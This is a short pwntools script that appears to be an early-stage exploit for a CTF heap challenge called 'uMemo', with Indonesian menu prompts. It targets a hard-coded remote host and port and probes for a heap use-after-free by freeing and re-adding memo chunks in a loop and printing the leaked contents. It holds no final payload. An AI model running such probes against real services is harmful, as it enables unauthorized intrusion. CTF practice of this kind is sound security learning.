from pwn import *

context.terminal = "tmux splitw -h".split(" ")
elf = context.binary = ELF("./uMemo")
libc = elf.libc

HOST = "103.37.125.237"
PORT = 10005

cmd = """

"""

if args.REMOTE:
        p = remote(HOST,PORT)
else:
        p = elf.process()
#        gdb.attach(p,cmd)

# variable goes here
sla = lambda x,y: p.sendlineafter(x,y)
sa = lambda x,y: p.sendafter(x,y)
sl = lambda x: p.sendline(x)
sn = lambda x: p.send(x)
ru = lambda x,y: p.recvuntil(x, drop=y)
rl = lambda x: p.recvline(0)
rn = lambda x: p.recvn(x)
make_block = lambda x: [unpack(x[i:i+4],'all') for i in range(0,len(x),4)]

def add(index,data):
    sla(b'Keluar\n',b'1')
    sla(b': ', str(index).encode())
    sa(b': ', data)

def free(index):
    sla(b'Keluar\n',b'2')
    sla(b': ', str(index).encode())

def show(index):
    sla(b'Keluar\n', b'3')
    sla(b': ',str(index).encode())
    ru(b"Isi memo: ", 1)
    res = ru(b"\n--- ", 1)
    return res
    
add(0, b"A"*16)
free(0)

for i in range(1,50):
    free(i)
    add(1, b"A"*16)
    print(show(1))

p.interactive()
